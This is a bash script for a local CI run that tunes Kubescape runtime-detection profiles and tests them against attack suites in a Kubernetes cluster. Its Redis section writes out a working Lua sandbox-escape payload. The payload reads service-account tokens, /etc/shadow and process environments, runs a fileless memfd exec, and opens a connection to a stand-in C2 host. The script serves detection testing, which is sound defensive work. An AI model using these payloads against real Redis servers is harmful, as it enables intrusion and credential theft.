#!/usr/bin/env bash
# local-ci.sh — local mirror of .github/workflows/ci-bobctl-autotune.yaml
#
# Usage:
#   ./scripts/local-ci.sh                    # full run (setup + install + collapse + tune)
#   ./scripts/local-ci.sh --tune-only        # skip infra setup, re-run collapse + tune on existing profile
#   ./scripts/local-ci.sh --setup-only       # only set up infra (kubescape + alertmanager + webapp)
#   ./scripts/local-ci.sh --app redis        # tune redis instead of webapp (default: webapp)
#
# Differences from CI:
#   - learn timeout is 3m (kubescape values.yaml sets maxLearningPeriod: 2m)
#   - uses kubeconfig from env or ~/.kube/config
#   - uses K8s API service proxy (no port-forwarding needed)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$REPO_ROOT"

# ── defaults ────────────────────────────────────────────────────────────────
TUNE_ONLY=false
SETUP_ONLY=false
APP=webapp
KS_NS=honey

while [[ $# -gt 0 ]]; do
  case "$1" in
    --tune-only)  TUNE_ONLY=true; shift ;;
    --setup-only) SETUP_ONLY=true; shift ;;
    --app)        APP="${2:-webapp}"; shift 2 ;;
    *)            shift ;;
  esac
done

log()  { echo "[$(date +%H:%M:%S)] $*"; }
die()  { log "ERROR: $*"; exit 1; }

# ── app-specific config ────────────────────────────────────────────────────
case "$APP" in
  webapp)
    APP_NS=webapp
    APP_FUNC_TESTS=example/webapp-functional-tests.yaml
    APP_ATTACKS=example/webapp-attacks.yaml
    APP_SERVICE=webapp-mywebapp
    APP_PORT=8080
    ;;
  redis)
    APP_NS=redis
    APP_FUNC_TESTS=example/redis-functional-tests.yaml
    APP_ATTACKS=example/redis-attacks.yaml
    APP_SERVICE=redis
    APP_PORT=6379
    ;;
  misp)
    APP_NS=misp
    APP_FUNC_TESTS=example/misp-functional-tests.yaml
    APP_ATTACKS=example/misp-attacks.yaml
    APP_SERVICE=misp
    APP_PORT=443
    APP_SCHEME=https
    ;;
  elk)
    APP_NS=elk
    APP_FUNC_TESTS=example/elk-functional-tests.yaml
    APP_ATTACKS=example/elk-attacks.yaml
    APP_SERVICE=el-es-http
    APP_PORT=9200
    APP_PROFILE_MATCH="el-es"
    ;;
  *)
    die "Unknown app: $APP (use webapp, redis, misp, or elk)"
    ;;
esac

APP_SCHEME="${APP_SCHEME:-http}"

# ── build ────────────────────────────────────────────────────────────────────
log "=== Build bobctl ==="
cd pkg
go build -o ../bin/bobctl ./main.go
cd ..
log "Build OK: bin/bobctl"

if $SETUP_ONLY || ! $TUNE_ONLY; then
  # ── install kubescape ──────────────────────────────────────────────────────
  log "=== Install kubescape (namespace: $KS_NS) ==="
  make kubescape

  # ── install alertmanager ───────────────────────────────────────────────────
  log "=== Install alertmanager ==="
  make alertmanager

  # ── wait for kubescape components ──────────────────────────────────────────
  log "=== Wait for kubescape components ==="
  kubectl wait --for=condition=ready pod -l app=node-agent   -n "$KS_NS" --timeout=180s
  kubectl wait --for=condition=ready pod -l app=storage      -n "$KS_NS" --timeout=180s
  kubectl wait --for=condition=ready pod -l app=alertmanager -n "$KS_NS" --timeout=120s
  log "All kubescape components ready"

  if $SETUP_ONLY; then
    log "=== Setup complete (--setup-only). Deploy app and run --tune-only next. ==="
    exit 0
  fi
fi

# ── deploy and learn app ─────────────────────────────────────────────────────
if ! $TUNE_ONLY; then
  log "=== Deploy $APP via: make deploy-$APP ==="
  make deploy-"$APP"
  log "Deploy complete. Pods in $APP_NS:"
  kubectl get pods -n "$APP_NS" || true

  # ── learn: exercise app + poll for completed profile ────────────────────────
  log "=== Learn $APP ==="
  MATCH="${APP_PROFILE_MATCH:-$APP}"

  # Run functional tests to exercise the app while node-agent learns
  log "Running functional tests during learning period..."
  for i in $(seq 1 8); do
    bin/bobctl learn \
      --functional-tests "$APP_FUNC_TESTS" \
      -n "$APP_NS" --timeout 15s --interval 15s -v 2>&1 | tail -5 || true
    sleep 10
  done

  # Poll for completed, non-user-generated profile
  log "Waiting for completed profile (match: '$MATCH')..."
  TIMEOUT=600
  ELAPSED=0
  PROFILE=""
  while [ $ELAPSED -lt $TIMEOUT ]; do
    ALL_COMPLETED=$(kubectl get applicationprofiles -n "$APP_NS" \
      -o jsonpath='{range .items[?(@.metadata.annotations.kubescape\.io/status=="completed")]}{.metadata.name}{"\n"}{end}' \
      2>/dev/null | grep -v "^ug-" || true)
    PROFILE=$(echo "$ALL_COMPLETED" | grep -i "$MATCH" | grep -v "client" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_COMPLETED" | grep -i "$MATCH" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_COMPLETED" | head -1)
    if [[ -n "$PROFILE" ]]; then
      log "Profile completed: $PROFILE"
      log "All completed profiles in $APP_NS:"
      echo "$ALL_COMPLETED" | while read -r p; do [[ -n "$p" ]] && log "  - $p"; done
      break
    fi
    log "  No completed profile yet ($ELAPSED/${TIMEOUT}s)..."
    sleep 15
    ELAPSED=$((ELAPSED + 15))
  done
  [[ -n "$PROFILE" ]] || die "No completed profile found after ${TIMEOUT}s"

  log "Learned profile: $PROFILE"
  echo "$PROFILE" > /tmp/bobctl-last-profile-$APP
else
  # Re-use last learned profile
  if [[ -f /tmp/bobctl-last-profile-$APP ]]; then
    PROFILE=$(cat /tmp/bobctl-last-profile-$APP)
    log "Re-using saved profile: $PROFILE"
  else
    # Discover from cluster — prefer profile whose name contains the app/service name
    log "Discovering completed profiles in $APP_NS..."
    ALL_LEARNED=$(kubectl get applicationprofiles -n "$APP_NS" \
      -o jsonpath='{range .items[?(@.metadata.annotations.kubescape\.io/status=="completed")]}{.metadata.name}{"\n"}{end}' \
      2>/dev/null | grep -v "^ug-" || true)
    MATCH="${APP_PROFILE_MATCH:-$APP}"
    PROFILE=$(echo "$ALL_LEARNED" | grep -i "$MATCH" | grep -v "client" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | grep -i "$APP" | head -1)
    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | head -1)
    [[ -n "$PROFILE" ]] || die "No completed learned profile found in $APP_NS. Run without --tune-only first."
    log "Discovered profile: $PROFILE"
  fi
fi

# ── clean results (prevent cross-app contamination) ─────────────────────────
rm -rf results
mkdir -p results

# ── run collapse analysis ────────────────────────────────────────────────────
log "=== Run collapse analysis ==="
set +e
bin/bobctl collapse \
  --namespaces "$APP_NS" \
  --noisy-threshold 10 \
  --apply \
  -v 2>&1 | tee results/collapse-analysis.txt
COLLAPSE_EXIT=${PIPESTATUS[0]}
set -e
if [[ "$COLLAPSE_EXIT" -eq 0 ]]; then
  log "Collapse analysis: OK"
else
  log "Collapse analysis: finished with exit $COLLAPSE_EXIT (continuing)"
fi

# ── run tune ─────────────────────────────────────────────────────────────────
log "=== Run tune ==="
set +e
SCHEME_FLAG=""
if [[ "$APP_SCHEME" == "https" ]]; then
  SCHEME_FLAG="--service-scheme https"
fi
bin/bobctl tune \
  --profile "$PROFILE" \
  -n "$APP_NS" \
  --ks-namespace "$KS_NS" \
  --service "$APP_SERVICE" \
  --service-port "$APP_PORT" \
  --alertmanager-service alertmanager \
  --alertmanager-port 9093 \
  --functional-tests "$APP_FUNC_TESTS" \
  --attack-suite "$APP_ATTACKS" \
  --output-dir results \
  --max-rounds 3 \
  --debug \
  $SCHEME_FLAG \
  -v 2>&1 | tee /tmp/tune-output.txt
TUNE_EXIT=${PIPESTATUS[0]}
set -e

# ── render tune metrics GIF ──────────────────────────────────────────────────
if [[ -f results/metrics.json ]]; then
  log "=== Render tune metrics GIF ==="
  "$SCRIPT_DIR/render-gif.sh" results/metrics.json results/tune.gif --title "$APP (local)" || \
    log "WARNING: GIF rendering failed (non-fatal)"
fi

# ── redis post-tune: direct attack verification ─────────────────────────────
if [[ "$APP" == "redis" ]]; then
  log "=== Redis post-tune attack verification (12 attacks) ==="
  REDIS_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis \
    -o jsonpath='{.items[0].metadata.name}')

  LUA_ESCAPE='local io_mod=nil;pcall(function() if type(io)=="table" and io.popen then io_mod=io end end);if not io_mod then pcall(function() local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");if l then io_mod=l() end end) end;if not io_mod then return "sandbox_blocked" end;'

  run_eval() {
    local name="$1" script="$2"
    echo -n "  [$name] "
    result=$(kubectl -n redis exec "$REDIS_POD" -- redis-cli EVAL "$script" 0 2>&1) || true
    echo "$(echo $result | head -c 80)"
  }

  # 1: Fileless memfd_create + execve (R1005)
  log "Attack 1: Fileless memfd (R1005)"
  kubectl -n redis exec "$REDIS_POD" -- perl -e '
    my $name = "pwned\0";
    my $fd = syscall(319, $name, 0);
    die "memfd_create failed" if $fd < 0;
    open(my $src, "<:raw", "/bin/echo") or die "open: $!";
    open(my $dst, ">&=", $fd) or die "dup: $!";
    binmode $dst; my $buf;
    while (my $n = read($src, $buf, 8192)) { print $dst $buf; }
    close($src);
    exec("/proc/self/fd/$fd", "echo", "FILELESS-EXEC-DETECTED");
  ' 2>&1 || echo "  memfd exec completed"

  # 2-12: EVAL-based attacks via Lua sandbox escape
  run_eval "SA-token-R0006" "${LUA_ESCAPE} local f=io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token');local o=f:read('*a');f:close();return o"
  run_eval "shadow-R0010" "${LUA_ESCAPE} local f=io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted');local o=f:read('*a');f:close();return o"
  run_eval "whoami-R0001" "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'user:' .. o"
  run_eval "dns-R0005" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done');local o=f:read('*a');f:close();return 'dns:' .. o"
  run_eval "drifted-R1001" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis');local o=f:read('*a');f:close();return 'drifted:' .. o"
  run_eval "devshm-R1000" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious');local o=f:read('*a');f:close();return 'shm:' .. o"
  run_eval "environ-R0008" "${LUA_ESCAPE} local f=io_mod.popen('cat /proc/1/environ 2>/dev/null | tr \"\\\\0\" \"\\\\n\" | head -1 || echo no_environ');local o=f:read('*a');f:close();return 'environ:' .. o"
  run_eval "symlink-R1010" "${LUA_ESCAPE} local f=io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1; rm -f /tmp/shadow_link; echo symlink_done');local o=f:read('*a');f:close();return 'symlink:' .. o"
  run_eval "mining-R1008" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done');local o=f:read('*a');f:close();return 'mining:' .. o"
  run_eval "perl-c2-R0001" "${LUA_ESCAPE}"' local f=io_mod.popen("perl -e '"'"'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>80,Timeout=>2);print defined $s ? \"ok\" : \"fail\";'"'"' 2>&1; echo done");local o=f:read("*a");f:close();return "c2:" .. o'
  run_eval "creds-R0001" "${LUA_ESCAPE}"' local f=io_mod.popen("awk -F: '"'"'$3==0{print $1}'"'"' /etc/passwd && id 2>&1");local o=f:read("*a");f:close();return "creds:" .. o'

  log "All 12 Redis attacks executed. Waiting for alert propagation..."
  sleep 15

  # ── Cross-pod endpoint test ────────────────────────────────────────────────
  # Attacks from redis-client pod → Redis service over the network.
  # This tests endpoint detection: node-agent sees real pod-to-pod traffic.
  log "=== Cross-pod endpoint test ==="
  kubectl -n redis wait --for=condition=ready pod -l app.kubernetes.io/name=redis-client --timeout=60s 2>/dev/null || true
  CLIENT_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis-client \
    -o jsonpath='{.items[0].metadata.name}' 2>/dev/null) || true

  if [[ -n "$CLIENT_POD" ]]; then
    log "Client pod: $CLIENT_POD"

    # Benign: PING via standard port (should be in profile)
    log "  Cross-pod benign: PING via redis:6379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 PING 2>&1 || true

    # Benign: SET/GET via standard port
    log "  Cross-pod benign: SET/GET via redis:6379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 SET crosstest hello 2>&1 || true
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 GET crosstest 2>&1 || true

    # Alt-port: PING via non-standard port 16379 (redis-alt-port service)
    # If profile has port=6379, this should be an endpoint anomaly.
    # If profile has port=0 (wildcard), this is silently allowed — proving the risk.
    log "  Cross-pod alt-port: PING via redis-alt-port:16379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis-alt-port -p 16379 PING 2>&1 || true

    # Attack: Lua sandbox escape from cross-pod client
    log "  Cross-pod attack: Lua exploit via redis:6379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 \
      EVAL "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'crosspod:' .. o" 0 2>&1 || true

    # Attack: Same exploit via alt-port
    log "  Cross-pod attack: Lua exploit via redis-alt-port:16379"
    kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis-alt-port -p 16379 \
      EVAL "${LUA_ESCAPE} local f=io_mod.popen('id');local o=f:read('*a');f:close();return 'altport:' .. o" 0 2>&1 || true

    # Dump the learned profile's endpoints for verification
    log "  Profile endpoints:"
    kubectl get applicationprofile -n redis -o jsonpath='{range .items[*]}{.metadata.name}{": "}{range .spec.containers[*]}{.name}={.endpoints}{" "}{end}{"\n"}{end}' 2>/dev/null || echo "  (no profiles found)"

    sleep 10
  else
    log "WARNING: redis-client pod not found, skipping cross-pod tests"
  fi
fi

# ── export best profile ──────────────────────────────────────────────────────
log "=== Export best profile ==="
if [[ -f results/metrics.json ]]; then
  BEST_ITER=$(python3 -c "
import json
with open('results/metrics.json') as f:
    records = json.load(f)
tested = [r for r in records if r['phase'] != 'raw-baseline']
if tested:
    best = min(tested, key=lambda r: r['score'])
    print(best['iteration'])
" 2>/dev/null || echo "")
  BEST_FILE="results/${PROFILE}-iteration${BEST_ITER}.yaml"
  if [[ -n "$BEST_ITER" ]] && [[ -f "$BEST_FILE" ]]; then
    log "Best iteration: $BEST_ITER"
    # Strip kubescape annotations (no pyyaml dependency)
    grep -v '^\s*kubescape\.io/' "$BEST_FILE" \
      | grep -v '^\s*spdx\.softwarecomposition\.kubescape\.io/' \
      > results/best-profile.yaml \
      || cp "$BEST_FILE" results/best-profile.yaml
    log "Best profile: results/best-profile.yaml"
  else
    log "WARNING: Could not find best iteration file: $BEST_FILE"
  fi
fi

# ── run attacks (separate pass for detection report) ─────────────────────────
log "=== Run attacks ==="
set +e
bin/bobctl attack \
  --attack-suite "$APP_ATTACKS" \
  -n "$APP_NS" \
  --ks-namespace "$KS_NS" \
  --service "$APP_SERVICE" \
  --service-port "$APP_PORT" \
  --format markdown 2>&1 | tee results/attack-results.md
set -e

# ── detection report ─────────────────────────────────────────────────────────
log "=== Detection report ==="
set +e
bin/bobctl report \
  --alertmanager-service alertmanager \
  --alertmanager-port 9093 \
  --ks-namespace "$KS_NS" \
  -n "$APP_NS" \
  --format markdown 2>&1 | tee results/detection-report.md
set -e

# ── collect diagnostics ──────────────────────────────────────────────────────
log "=== Diagnostics ==="
echo "--- Node-agent logs (last 100) ---"
kubectl logs -n "$KS_NS" -l app=node-agent --tail=100 2>/dev/null || echo "(no node-agent logs)"
echo "--- Storage logs (last 50) ---"
kubectl logs -n "$KS_NS" -l app=storage --tail=50 2>/dev/null || echo "(no storage logs)"
echo "--- Alertmanager alerts ---"
kubectl get --raw \
  "/api/v1/namespaces/$KS_NS/services/alertmanager:9093/proxy/api/v2/alerts?active=true" \
  2>/dev/null | python3 -c "
import json,sys
for a in json.load(sys.stdin):
  l=a.get('labels',{})
  print(f\"  rule={l.get('rule_name','?')} comm={l.get('comm','?')} ns={l.get('namespace','?')}\")
" 2>/dev/null || echo "  (no alerts or alertmanager unreachable)"

# ── validate artifact isolation ───────────────────────────────────────────────
log "=== Artifact isolation check ==="
FOREIGN_FILES=""
for f in results/*-iteration*.yaml; do
  [[ -f "$f" ]] || continue
  if ! echo "$f" | grep -q "$APP"; then
    FOREIGN_FILES="$FOREIGN_FILES $f"
  fi
done
if [[ -n "$FOREIGN_FILES" ]]; then
  log "FAIL: Found files from other apps in results/:"
  log "  $FOREIGN_FILES"
  log "  Test isolation is broken — results are bleeding between apps."
else
  log "PASS: All iteration files belong to $APP"
  ls results/*-iteration*.yaml 2>/dev/null || true
fi

# ── result files ─────────────────────────────────────────────────────────────
echo
log "=== Results ==="
ls -la results/ 2>/dev/null || true

# ── score gate ────────────────────────────────────────────────────────────────
echo
if [[ -f results/metrics.json ]]; then
  BEST_SCORE=$(python3 -c "
import json
with open('results/metrics.json') as f:
    records = json.load(f)
tested = [r for r in records if r['phase'] != 'raw-baseline']
if tested:
    print(min(r['score'] for r in tested))
else:
    print('N/A')
" 2>/dev/null || echo "N/A")
  log "Best score: $BEST_SCORE"
  if [[ "$BEST_SCORE" == "0" ]]; then
    log "RESULT: PERFECT — all attacks detected, zero false positives"
  else
    log "RESULT: IMPERFECT (best score=$BEST_SCORE) — review results/ for details"
  fi
else
  log "RESULT: No metrics.json produced — tune may have failed"
fi
